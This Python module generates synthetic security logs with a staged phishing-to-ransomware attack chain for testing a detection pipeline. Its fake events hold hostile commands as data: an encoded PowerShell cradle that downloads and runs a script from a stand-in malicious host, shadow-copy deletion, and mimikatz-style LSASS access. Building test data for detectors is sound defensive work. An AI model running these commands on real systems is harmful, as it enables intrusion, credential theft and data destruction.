"""Synthetic log generator.

Real deployments replace this module entirely:
  - emails.jsonl        <- IMAP/Graph API mailbox polling  (email_parser.py)
  - windows_security.*  <- win32evtlog / python-evtx reading .evtx exports
  - sysmon.jsonl        <- Sysmon EVTX (channel: Microsoft-Windows-Sysmon/Operational)
  - powershell.jsonl    <- EID 4104 Script Block Logging
  - cloud_auth.jsonl    <- Azure AD / Okta / Google Workspace sign-in logs

For this project we generate realistic JSONL so the detection + correlation
+ reporting pipeline can be demoed and tested end-to-end without needing a
live Windows domain, a live mailbox, or paid API access. Every event has the
exact same fields a real collector would produce, so swapping this module
out later requires zero changes downstream.
"""
import json
import os
import random
from datetime import datetime, timedelta, timezone


def _iso(dt: datetime) -> str:
    return dt.replace(tzinfo=timezone.utc).isoformat()


def _write_jsonl(path: str, events: list[dict]):
    with open(path, "w", encoding="utf-8") as f:
        for e in events:
            f.write(json.dumps(e) + "\n")


def generate_all(sample_data_dir: str, seed: int = 42):
    """Writes emails.jsonl, windows_security.jsonl, sysmon.jsonl,
    powershell.jsonl, cloud_auth.jsonl into sample_data_dir.
    Contains ONE full attack-chain scenario (kill chain across a
    compromised service account) + ONE impossible-travel scenario +
    benign background noise, so every detector has something real to find.
    """
    random.seed(seed)
    os.makedirs(sample_data_dir, exist_ok=True)
    base = datetime(2026, 9, 18, 8, 0, 0)

    emails, winsec, sysmon, posh, cloud = [], [], [], [], []

    # ---------------------------------------------------------------
    # STAGE 0: benign background noise (so detectors must actually
    # discriminate, not just fire on the presence of any event)
    # ---------------------------------------------------------------
    normal_users = ["asharma", "rgupta", "pverma", "nkhan"]
    for i in range(15):
        t = base + timedelta(minutes=random.randint(0, 500))
        emails.append({
            "source": "email", "timestamp": _iso(t),
            "from": f"{random.choice(normal_users)}@partner-corp.com",
            "to": random.choice(normal_users) + "@ourcompany.com",
            "subject": "Re: Weekly sync notes", "spf": "pass", "dkim": "pass", "dmarc": "pass",
            "urls": [], "attachments": [],
        })
        winsec.append({
            "source": "windows_security", "timestamp": _iso(t), "event_id": 4624,
            "user": random.choice(normal_users), "host": "WKSTN-0" + str(random.randint(1, 6)),
            "src_ip": "10.0.1." + str(random.randint(20, 60)), "logon_type": 2,
        })

    # ---------------------------------------------------------------
    # STAGE 1: Phishing email lands on svc_admin's workstation user (jdoe)
    # ---------------------------------------------------------------
    t = base
    emails.append({
        "source": "email", "timestamp": _iso(t),
        "from": "billing-support@free-invoice-pay.top",
        "to": "jdoe@ourcompany.com",
        "subject": "URGENT: Invoice #48213 Overdue - Action Required",
        "spf": "fail", "dkim": "fail", "dmarc": "fail",
        "urls": ["http://free-invoice-pay.top/inv/click?id=48213"],
        "attachments": ["Invoice_48213.js"],
    })

    # victim executes the attachment -> malicious process creation (Sysmon EID1)
    t += timedelta(minutes=6)
    sysmon.append({
        "source": "sysmon", "timestamp": _iso(t), "event_id": 1,
        "host": "WKSTN-07", "user": "jdoe",
        "image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\Invoice_48213.js",
        "command_line": "wscript.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\Invoice_48213.js",
        "hashes": "MD5=44d88612fea8a8f36de82e1278abb02f",
        "parent_image": "explorer.exe",
    })

    # ---------------------------------------------------------------
    # STAGE 2: dropper pulls a PowerShell download cradle (EID 4104)
    # ---------------------------------------------------------------
    t += timedelta(minutes=2)
    posh.append({
        "source": "powershell", "timestamp": _iso(t), "event_id": 4104,
        "host": "WKSTN-07", "user": "jdoe",
        "script_block": (
            "powershell.exe -nop -w hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQB1AHAAZABhAHQAZQAtAHMAZQByAHYAZQByAC4AYwBvAG0ALwBwAC4AcABzADEAJwApAA=="
        ),
    })

    # ---------------------------------------------------------------
    # STAGE 3: attacker now targets the domain admin account: brute force
    # (svc_admin), 6 failures then 1 success, from an external-looking IP
    # ---------------------------------------------------------------
    for i in range(6):
        t += timedelta(seconds=25)
        winsec.append({
            "source": "windows_security", "timestamp": _iso(t), "event_id": 4625,
            "user": "svc_admin", "host": "DC-01", "src_ip": "185.220.101.47", "logon_type": 3,
            "failure_reason": "Unknown user name or bad password",
        })
    t += timedelta(seconds=30)
    winsec.append({
        "source": "windows_security", "timestamp": _iso(t), "event_id": 4624,
        "user": "svc_admin", "host": "DC-01", "src_ip": "185.220.101.47", "logon_type": 3,
    })

    # ---------------------------------------------------------------
    # STAGE 4: credential dumping - LSASS memory access from a
    # mimikatz-like process (Sysmon EID 10)
    # ---------------------------------------------------------------
    t += timedelta(minutes=3)
    sysmon.append({
        "source": "sysmon", "timestamp": _iso(t), "event_id": 10,
        "host": "WKSTN-07", "user": "svc_admin",
        "source_image": "C:\\Users\\svc_admin\\AppData\\Local\\Temp\\mimikatz.exe",
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "granted_access": "0x1fffff",
    })

    # ---------------------------------------------------------------
    # STAGE 5: persistence - scheduled task (EID 4698) + registry run key
    # ---------------------------------------------------------------
    t += timedelta(minutes=4)
    winsec.append({
        "source": "windows_security", "timestamp": _iso(t), "event_id": 4698,
        "user": "svc_admin", "host": "WKSTN-07",
        "task_name": "\\Microsoft\\Windows\\UpdateHealthCheck",
        "task_action": "powershell.exe -enc <base64> -w hidden -File C:\\Users\\svc_admin\\AppData\\Roaming\\upd.ps1",
    })
    t += timedelta(minutes=1)
    sysmon.append({
        "source": "sysmon", "timestamp": _iso(t), "event_id": 13,
        "host": "WKSTN-07", "user": "svc_admin",
        "target_object": "HKU\\svc_admin\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        "details": "C:\\Users\\svc_admin\\AppData\\Roaming\\upd.exe",
    })

    # ---------------------------------------------------------------
    # STAGE 6: lateral movement - admin share access + PsExec across
    # 3 hosts within 15 minutes using the same compromised account
    # ---------------------------------------------------------------
    for host in ["FILESERVER-01", "APPSERVER-02", "DC-01"]:
        t += timedelta(minutes=3)
        winsec.append({
            "source": "windows_security", "timestamp": _iso(t), "event_id": 5140,
            "user": "svc_admin", "host": host, "src_ip": "10.0.1.15",
            "share_name": "\\\\" + host + "\\ADMIN$",
        })
        t += timedelta(seconds=40)
        sysmon.append({
            "source": "sysmon", "timestamp": _iso(t), "event_id": 1,
            "host": host, "user": "svc_admin",
            "image": "C:\\Windows\\PSEXESVC.exe",
            "command_line": "PSEXESVC.exe",
            "parent_image": "services.exe",
        })

    # ---------------------------------------------------------------
    # STAGE 7: ransomware - shadow copy deletion + mass file encryption
    # on the file server
    # ---------------------------------------------------------------
    t += timedelta(minutes=2)
    sysmon.append({
        "source": "sysmon", "timestamp": _iso(t), "event_id": 1,
        "host": "FILESERVER-01", "user": "svc_admin",
        "image": "C:\\Windows\\System32\\vssadmin.exe",
        "command_line": "vssadmin delete shadows /all /quiet",
        "parent_image": "cmd.exe",
    })
    for i in range(35):
        t += timedelta(seconds=2)
        sysmon.append({
            "source": "sysmon", "timestamp": _iso(t), "event_id": 11,
            "host": "FILESERVER-01", "user": "svc_admin",
            "target_filename": f"\\\\FILESERVER-01\\Shares\\Finance\\report_{i}.xlsx.locked",
        })

    # ---------------------------------------------------------------
    # STAGE 8 (independent scenario): impossible travel for the CEO
    # account via cloud/AD sign-in logs
    # ---------------------------------------------------------------
    t2 = base + timedelta(hours=2)
    cloud.append({
        "source": "cloud_auth", "timestamp": _iso(t2), "user": "ceo@ourcompany.com",
        "src_ip": "103.21.244.10", "city": "Mumbai", "country": "India",
        "lat": 19.0760, "lon": 72.8777, "app": "Microsoft 365",
    })
    t2 += timedelta(minutes=40)
    cloud.append({
        "source": "cloud_auth", "timestamp": _iso(t2), "user": "ceo@ourcompany.com",
        "src_ip": "74.125.21.100", "city": "New York", "country": "USA",
        "lat": 40.7128, "lon": -74.0060, "app": "Microsoft 365",
    })
    # plus benign cloud logons for noise
    for i in range(10):
        t3 = base + timedelta(minutes=random.randint(0, 500))
        cloud.append({
            "source": "cloud_auth", "timestamp": _iso(t3), "user": random.choice(normal_users) + "@ourcompany.com",
            "src_ip": "10.0.1." + str(random.randint(20, 60)), "city": "Bengaluru", "country": "India",
            "lat": 12.9716, "lon": 77.5946, "app": "Microsoft 365",
        })

    _write_jsonl(os.path.join(sample_data_dir, "emails.jsonl"), emails)
    _write_jsonl(os.path.join(sample_data_dir, "windows_security.jsonl"), winsec)
    _write_jsonl(os.path.join(sample_data_dir, "sysmon.jsonl"), sysmon)
    _write_jsonl(os.path.join(sample_data_dir, "powershell.jsonl"), posh)
    _write_jsonl(os.path.join(sample_data_dir, "cloud_auth.jsonl"), cloud)

    return {
        "emails": len(emails), "windows_security": len(winsec),
        "sysmon": len(sysmon), "powershell": len(posh), "cloud_auth": len(cloud),
    }
